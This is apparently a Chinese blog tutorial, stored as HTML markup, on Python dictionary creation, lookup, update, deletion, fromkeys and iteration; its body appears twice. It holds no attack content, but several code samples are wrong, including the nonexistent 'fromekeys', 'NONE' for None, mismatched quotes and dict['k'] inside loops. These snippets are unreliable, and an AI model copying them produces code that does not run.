class=\"line\">dic.get(<span class=\"string\">'other'</span>,<span class=\"string\">'abc'</span>)     <span class=\"comment\">#不存在‘other’键时，返回‘abc’</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>get()与索引的区别在于，索引不存在的键时会引发异常错误，而get()不存在的键时，默认会返回NONE，也可自己设置（如上面第三个栗子）。</li>\n</ul>\n<h5 id=\"in-成员关系测试\"><a href=\"#in-成员关系测试\" class=\"headerlink\" title=\"in #成员关系测试\"></a>in #成员关系测试</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:&#123;<span class=\"string\">'IT'</span>:hacke<span class=\"string\">r'&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">'</span>name<span class=\"string\">' in dic     #测试字典是否存在key'</span>name<span class=\"string\">'</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"items-列出所有键值对\"><a href=\"#items-列出所有键值对\" class=\"headerlink\" title=\"items() #列出所有键值对\"></a>items() #列出所有键值对</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.items()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>返回的结果是形似以元组为元素的列表的可迭代对象</li>\n</ul>\n<h5 id=\"keys-列出所有键名列表\"><a href=\"#keys-列出所有键名列表\" class=\"headerlink\" title=\"keys() #列出所有键名列表\"></a>keys() #列出所有键名列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.keys()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>返回形似列表的可迭代对象</li>\n</ul>\n<h5 id=\"value-列出所有值列表\"><a href=\"#value-列出所有值列表\" class=\"headerlink\" title=\"value() #列出所有值列表\"></a>value() #列出所有值列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.values()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>返回形似列表的可迭代对象</li>\n</ul>\n<h4 id=\"增相关\"><a href=\"#增相关\" class=\"headerlink\" title=\"增相关\"></a><strong>增相关</strong></h4><h5 id=\"赋值\"><a href=\"#赋值\" class=\"headerlink\" title=\"赋值\"></a>赋值</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic=&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dic[<span class=\"string\">'age'</span>]=<span class=\"number\">18</span>                 <span class=\"comment\">#新增一个key为'age',value为18</span></span><br><span class=\"line\">dic[<span class=\"string\">'other'</span>]=&#123;<span class=\"string\">'sex'</span>:<span class=\"string\">'man'</span>&#125;    <span class=\"comment\">#嵌套赋值</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>已有则修改，无则新增</li>\n</ul>\n<h5 id=\"update-合并字典\"><a href=\"#update-合并字典\" class=\"headerlink\" title=\"update() #合并字典\"></a>update() #合并字典</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic1 = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>&#125;</span><br><span class=\"line\">dic2 = &#123;<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dic1.update(dic2)      <span class=\"comment\">#将dic2合并至dic1</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"setdefault-增或查\"><a href=\"#setdefault-增或查\" class=\"headerlink\" title=\"setdefault() #增或查\"></a>setdefault() #增或查</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>&#125;</span><br><span class=\"line\">dic.setdefault(<span class=\"string\">'name'</span>,<span class=\"number\">18</span>)               <span class=\"comment\">#已存在key'name',直接返回value'opaque'</span></span><br><span class=\"line\">dic.setdefault(<span class=\"string\">'age'</span>,<span class=\"number\">18</span>)                <span class=\"comment\">#新增</span></span><br><span class=\"line\">dic.setdefault(<span class=\"string\">'job'</span>,&#123;<span class=\"string\">'IT'</span>:<span class=\"string\">'hacker'</span>&#125;)   <span class=\"comment\">#新增</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>字典中已经存该key名，则返回对应的value，若key不存在，则插入key以及value。</li>\n</ul>\n<h4 id=\"改相关\"><a href=\"#改相关\" class=\"headerlink\" title=\"改相关\"></a><strong>改相关</strong></h4><h5 id=\"赋值修改\"><a href=\"#赋值修改\" class=\"headerlink\" title=\"赋值修改\"></a>赋值修改</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic=&#123;<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dic[<span class=\"string\">'job'</span>]=<span class=\"string\">'HACKER'</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"删相关\"><a href=\"#删相关\" class=\"headerlink\" title=\"删相关\"></a><strong>删相关</strong></h4><h5 id=\"pop-删除指定key的项\"><a href=\"#pop-删除指定key的项\" class=\"headerlink\" title=\"pop() #删除指定key的项\"></a>pop() #删除指定key的项</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dic.pop(<span class=\"string\">'name'</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>与列表的pop()差不多，会返回删除的key对应的value</li>\n</ul>\n<h5 id=\"popitem-随意删除一个项\"><a href=\"#popitem-随意删除一个项\" class=\"headerlink\" title=\"popitem() #随意删除一个项\"></a>popitem() #随意删除一个项</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.popitem()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>返回以被删除的键值作为元素的元组</li>\n</ul>\n<h5 id=\"del\"><a href=\"#del\" class=\"headerlink\" title=\"del\"></a>del</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">del</span> dic[<span class=\"string\">'name'</span>]</span><br></pre></td></tr></table></figure>\n<h4 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a><strong>其他</strong></h4><h5 id=\"fromkeys-初始化一个字典\"><a href=\"#fromkeys-初始化一个字典\" class=\"headerlink\" title=\"fromkeys() #初始化一个字典\"></a>fromkeys() #初始化一个字典</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = fromekeys([<span class=\"string\">'name'</span>,<span class=\"string\">'age'</span>])             <span class=\"comment\">#创建一个字典，key分别为'name'、'age',value都为NONE</span></span><br><span class=\"line\">dic = fromekeys((<span class=\"string\">'name'</span>,<span class=\"string\">'age'</span>),<span class=\"string\">'opaque'</span>)    <span class=\"comment\">#value都为'opaque'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一个参数为序列对象，序列中的元素作为key</li>\n<li>第二个参数为value，序列中的全部key共享引用该value。</li>\n<li>注意该value不要在嵌套，否则引用会有问题：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = fromekeys((<span class=\"string\">'name'</span>,<span class=\"string\">'age'</span>),&#123;<span class=\"string\">'a'</span>:<span class=\"string\">'opaque'</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">dic[name][<span class=\"string\">'a'</span>]=<span class=\"number\">2</span>     <span class=\"comment\">#会导致age的a的值也会变，因为共享引用</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"字典遍历\"><a href=\"#字典遍历\" class=\"headerlink\" title=\"字典遍历\"></a><strong>字典遍历</strong></h4><h5 id=\"三种方法\"><a href=\"#三种方法\" class=\"headerlink\" title=\"三种方法\"></a>三种方法</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">    print(k,dic[k])</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> dic.items():</span><br><span class=\"line\">    print(k,v)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dic.keys():</span><br><span class=\"line\">    print(k,dic[k])</span><br></pre></td></tr></table></figure>\n<ul>\n<li>优先第一种，第一种比第二种效率高，第二种有类型转换的过程。</li>\n</ul>\n<h4 id=\"二次总结\"><a href=\"#二次总结\" class=\"headerlink\" title=\"二次总结\"></a>二次总结</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>字典是任意对象的无序集合。</span><br><span class=\"line\"><span class=\"number\">2.</span>字典以键值对的方式存储。</span><br><span class=\"line\"><span class=\"number\">3.</span>字典是可以原处修改的对象，存储的是对象的引用。</span><br><span class=\"line\"><span class=\"number\">4.</span>强制类型转换：dict()</span><br><span class=\"line\"><span class=\"number\">5.</span>常量：</span><br><span class=\"line\">\tdict=&#123;<span class=\"string\">'k1'</span>:<span class=\"string\">'v1'</span>&#125;</span><br><span class=\"line\"><span class=\"number\">6.</span>操作：</span><br><span class=\"line\">\t查：</span><br><span class=\"line\">\t\t索引通过键索引，而不是下标：dict[<span class=\"string\">'key'</span>]</span><br><span class=\"line\">\t\tget() <span class=\"comment\">#根据键返回值,对比索引差别在于取不存在的键不会报错。</span></span><br><span class=\"line\">\t\titems()  <span class=\"comment\">#列出所有键值对</span></span><br><span class=\"line\">\t\tkeys()   <span class=\"comment\">#列出所有键名列表</span></span><br><span class=\"line\">\t\tvalues() <span class=\"comment\">#列出所有值列表</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t增：</span><br><span class=\"line\">\t\t索引不存在的键并赋值是新增一个元素。</span><br><span class=\"line\">\t\tupdate() <span class=\"comment\">#用一个字典新增到另一个字典中。（原处修改，同列表的extend()）</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t改：</span><br><span class=\"line\">\t\t索引已存在的键并赋新值是修改。</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t删：</span><br><span class=\"line\">\t\tpop()  <span class=\"comment\">#删除指定key的项并返回值。（原处修改）</span></span><br><span class=\"line\">\t\tpopitem() <span class=\"comment\">#随意删除一个项并返回键值。（原处修改）</span></span><br><span class=\"line\">\t\tclear()\t <span class=\"comment\">#清空字典</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">del</span> dict[<span class=\"string\">'key'</span>] <span class=\"comment\">#删除索引。（原处修改）</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"number\">6.</span>遍历字典：</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dict:</span><br><span class=\"line\">\t\t\t print(k,dict[<span class=\"string\">'k'</span>])</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> dict.items():</span><br><span class=\"line\">\t\t\tprint(k,v)</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dict.keys():</span><br><span class=\"line\">\t\t\tprint(k,dict[<span class=\"string\">'k'</span>])</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-字典概述\"><a href=\"#0x00-字典概述\" class=\"headerlink\" title=\"0x00 字典概述\"></a>0x00 字典概述</h3><ul>\n<li>任意对象的无序集合</li>\n<li>可任意嵌套</li>\n<li>属于可变类型对象 </li>\n<li>字典存储0个或多个对象的引用</li>\n<li>通过key而不是下标取值，且key具有唯一性</li>\n</ul>","more":"<h3 id=\"0x01-字典创建\"><a href=\"#0x01-字典创建\" class=\"headerlink\" title=\"0x01 字典创建\"></a>0x01 字典创建</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;&#125;</span><br><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\">dic = dict(name=<span class=\"string\">'opaque'</span>,job=<span class=\"string\">\"hacker\"</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x02-字典操作\"><a href=\"#0x02-字典操作\" class=\"headerlink\" title=\"0x02 字典操作\"></a>0x02 字典操作</h3><h4 id=\"查相关\"><a href=\"#查相关\" class=\"headerlink\" title=\"查相关\"></a><strong>查相关</strong></h4><h5 id=\"索引键\"><a href=\"#索引键\" class=\"headerlink\" title=\"索引键\"></a>索引键</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:&#123;<span class=\"string\">'IT'</span>:hacke<span class=\"string\">r'&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">dic['</span>name<span class=\"string\">']        #索引key为name对应的值，返回'</span>opaque<span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">dic['</span>jo<span class=\"string\">b']['</span>IT<span class=\"string\">']   #索引嵌套的内容，返回'</span>hacke<span class=\"string\">r'</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"get-根据键返回值\"><a href=\"#get-根据键返回值\" class=\"headerlink\" title=\"get() #根据键返回值\"></a>get() #根据键返回值</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.get(<span class=\"string\">'name'</span>)</span><br><span class=\"line\">dic.get(<span class=\"string\">'job'</span>).get(<span class=\"string\">'IT'</span>)</span><br><span class=\"line\">dic.get(<span class=\"string\">'other'</span>,<span class=\"string\">'abc'</span>)     <span class=\"comment\">#不存在‘other’键时，返回‘abc’</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>get()与索引的区别在于，索引不存在的键时会引发异常错误，而get()不存在的键时，默认会返回NONE，也可自己设置（如上面第三个栗子）。</li>\n</ul>\n<h5 id=\"in-成员关系测试\"><a href=\"#in-成员关系测试\" class=\"headerlink\" title=\"in #成员关系测试\"></a>in #成员关系测试</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:&#123;<span class=\"string\">'IT'</span>:hacke<span class=\"string\">r'&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">'</span>name<span class=\"string\">' in dic     #测试字典是否存在key'</span>name<span class=\"string\">'</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"items-列出所有键值对\"><a href=\"#items-列出所有键值对\" class=\"headerlink\" title=\"items() #列出所有键值对\"></a>items() #列出所有键值对</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.items()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>返回的结果是形似以元组为元素的列表的可迭代对象</li>\n</ul>\n<h5 id=\"keys-列出所有键名列表\"><a href=\"#keys-列出所有键名列表\" class=\"headerlink\" title=\"keys() #列出所有键名列表\"></a>keys() #列出所有键名列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.keys()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>返回形似列表的可迭代对象</li>\n</ul>\n<h5 id=\"value-列出所有值列表\"><a href=\"#value-列出所有值列表\" class=\"headerlink\" title=\"value() #列出所有值列表\"></a>value() #列出所有值列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.values()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>返回形似列表的可迭代对象</li>\n</ul>\n<h4 id=\"增相关\"><a href=\"#增相关\" class=\"headerlink\" title=\"增相关\"></a><strong>增相关</strong></h4><h5 id=\"赋值\"><a href=\"#赋值\" class=\"headerlink\" title=\"赋值\"></a>赋值</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic=&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dic[<span class=\"string\">'age'</span>]=<span class=\"number\">18</span>                 <span class=\"comment\">#新增一个key为'age',value为18</span></span><br><span class=\"line\">dic[<span class=\"string\">'other'</span>]=&#123;<span class=\"string\">'sex'</span>:<span class=\"string\">'man'</span>&#125;    <span class=\"comment\">#嵌套赋值</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>已有则修改，无则新增</li>\n</ul>\n<h5 id=\"update-合并字典\"><a href=\"#update-合并字典\" class=\"headerlink\" title=\"update() #合并字典\"></a>update() #合并字典</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic1 = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>&#125;</span><br><span class=\"line\">dic2 = &#123;<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dic1.update(dic2)      <span class=\"comment\">#将dic2合并至dic1</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"setdefault-增或查\"><a href=\"#setdefault-增或查\" class=\"headerlink\" title=\"setdefault() #增或查\"></a>setdefault() #增或查</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>&#125;</span><br><span class=\"line\">dic.setdefault(<span class=\"string\">'name'</span>,<span class=\"number\">18</span>)               <span class=\"comment\">#已存在key'name',直接返回value'opaque'</span></span><br><span class=\"line\">dic.setdefault(<span class=\"string\">'age'</span>,<span class=\"number\">18</span>)                <span class=\"comment\">#新增</span></span><br><span class=\"line\">dic.setdefault(<span class=\"string\">'job'</span>,&#123;<span class=\"string\">'IT'</span>:<span class=\"string\">'hacker'</span>&#125;)   <span class=\"comment\">#新增</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>字典中已经存该key名，则返回对应的value，若key不存在，则插入key以及value。</li>\n</ul>\n<h4 id=\"改相关\"><a href=\"#改相关\" class=\"headerlink\" title=\"改相关\"></a><strong>改相关</strong></h4><h5 id=\"赋值修改\"><a href=\"#赋值修改\" class=\"headerlink\" title=\"赋值修改\"></a>赋值修改</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic=&#123;<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dic[<span class=\"string\">'job'</span>]=<span class=\"string\">'HACKER'</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"删相关\"><a href=\"#删相关\" class=\"headerlink\" title=\"删相关\"></a><strong>删相关</strong></h4><h5 id=\"pop-删除指定key的项\"><a href=\"#pop-删除指定key的项\" class=\"headerlink\" title=\"pop() #删除指定key的项\"></a>pop() #删除指定key的项</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dic.pop(<span class=\"string\">'name'</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>与列表的pop()差不多，会返回删除的key对应的value</li>\n</ul>\n<h5 id=\"popitem-随意删除一个项\"><a href=\"#popitem-随意删除一个项\" class=\"headerlink\" title=\"popitem() #随意删除一个项\"></a>popitem() #随意删除一个项</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.popitem()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>返回以被删除的键值作为元素的元组</li>\n</ul>\n<h5 id=\"del\"><a href=\"#del\" class=\"headerlink\" title=\"del\"></a>del</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">del</span> dic[<span class=\"string\">'name'</span>]</span><br></pre></td></tr></table></figure>\n<h4 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a><strong>其他</strong></h4><h5 id=\"fromkeys-初始化一个字典\"><a href=\"#fromkeys-初始化一个字典\" class=\"headerlink\" title=\"fromkeys() #初始化一个字典\"></a>fromkeys() #初始化一个字典</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = fromekeys([<span class=\"string\">'name'</span>,<span class=\"string\">'age'</span>])             <span class=\"comment\">#创建一个字典，key分别为'name'、'age',value都为NONE</span></span><br><span class=\"line\">dic = fromekeys((<span class=\"string\">'name'</span>,<span class=\"string\">'age'</span>),<span class=\"string\">'opaque'</span>)    <span class=\"comment\">#value都为'opaque'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一个参数为序列对象，序列中的元素作为key</li>\n<li>第二个参数为value，序列中的全部key共享引用该value。</li>\n<li>注意该value不要在嵌套，否则引用会有问题：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = fromekeys((<span class=\"string\">'name'</span>,<span class=\"string\">'age'</span>),&#123;<span class=\"string\">'a'</span>:<span class=\"string\">'opaque'</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">dic[name][<span class=\"string\">'a'</span>]=<span class=\"number\">2</span>     <span class=\"comment\">#会导致age的a的值也会变，因为共享引用</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"字典遍历\"><a href=\"#字典遍历\" class=\"headerlink\" title=\"字典遍历\"></a><strong>字典遍历</strong></h4><h5 id=\"三种方法\"><a href=\"#三种方法\" class=\"headerlink\" title=\"三种方法\"></a>三种方法</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">    print(k,dic[k])</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> dic.items():</span><br><span class=\"line\">    print(k,v)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dic.keys():</span><br><span class=\"line\">    print(k,dic[k])</span><br></pre></td></tr></table></figure>\n<ul>\n<li>优先第一种，第一种比第二种效率高，第二种有类型转换的过程。</li>\n</ul>\n<h4 id=\"二次总结\"><a href=\"#二次总结\" class=\"headerlink\" title=\"二次总结\"></a>二次总结</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>字典是任意对象的无序集合。</span><br><span class=\"line\"><span class=\"number\">2.</span>字典以键值对的方式存储。</span><br><span class=\"line\"><span 